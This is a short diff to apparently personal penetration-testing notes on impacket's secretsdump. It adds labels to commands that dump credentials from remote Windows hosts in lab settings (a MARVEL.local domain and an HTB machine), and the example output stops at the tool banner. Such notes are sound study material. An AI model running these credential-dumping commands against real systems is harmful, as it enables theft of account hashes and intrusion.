@@ -1,12 +1,15 @@
 # secretsdump
 [impacket-secretsdump](https://github.com/toneillcodes/cybersecurity-notes/blob/main/windows/tools/impacket-tools.md#impacket-secretsdump)
 ## Remote
+With a password
 ```
 secretsdump.py MARVEL.local/hacker:'Password1'@10.0.2.15
 ```
+Prompt for password
 ```
 /usr/local/bin/secretsdump.py htb/jorge@10.129.240.61
 ```
+Example output
 ```
 $ /usr/local/bin/secretsdump.py htb/jorge@10.129.240.61
 Impacket v0.13.0.dev0+20240916.171021.65b774d - Copyright Fortra, LLC and its affiliated companies 
